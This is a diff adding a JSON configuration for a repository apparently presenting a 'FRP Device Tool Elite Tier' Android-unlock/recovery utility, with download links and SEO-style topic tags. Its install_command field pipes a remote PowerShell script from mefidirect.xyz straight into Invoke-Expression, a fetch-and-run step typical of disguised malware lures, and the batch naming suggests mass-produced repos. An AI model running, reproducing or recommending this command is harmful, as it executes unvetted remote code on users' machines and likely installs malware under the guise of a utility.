@@ -1,0 +1,27 @@
+{
+  "repo": "frp-device-tool-elite-tier",
+  "product": "FRP Device Tool Elite Tier",
+  "kind": "recovery",
+  "install_type": "download",
+  "download_url": "https://frp-tool.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "recovery",
+  "topics": [
+    "frp-tool-portable-ready",
+    "frp-tool-download-page",
+    "windows-11",
+    "clone-tools",
+    "user-manual",
+    "windows-10",
+    "frp-tool-install-steps",
+    "frp-tool-for-windows",
+    "quick-tips",
+    "drive-repair",
+    "device-backup",
+    "frp-tool-guide",
+    "file-restore"
+  ]
+}
